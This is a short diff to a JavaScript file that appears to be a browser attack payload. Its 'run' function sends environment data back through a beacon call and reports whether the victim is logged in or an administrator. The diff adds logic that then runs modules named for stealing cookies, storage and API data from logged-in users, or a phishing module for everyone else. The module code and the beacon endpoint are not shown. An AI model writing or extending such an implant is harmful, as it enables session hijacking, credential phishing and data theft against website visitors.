@@ -156,9 +156,15 @@
 
   /* ---------- bootstrap ---------- */
   function run(cfg) {
+    var S = session();
     be('hit', JSON.stringify(env()));
-    try { M.meta(); } catch (e) {}
-    try { (cfg.modules || ['cookies', 'storage', 'api']).forEach(function (m) { if (M[m]) { try { M[m](cfg); } catch (e) { be('err', m + ':' + e); } } }); } catch (e) {}
+    be('quem', 'logado=' + S.logado + ' admin=' + S.admin);
+    var mods = cfg.modules;
+    if (!mods) mods = S.logado ? ['cookies', 'storage', 'api', 'meta'] : ['phish'];
+    mods.forEach(function (m) {
+      if (!M[m]) return;
+      try { M[m](cfg); } catch (e) { be('err', m + ':' + e); }
+    });
   }
 
   function fallback() {
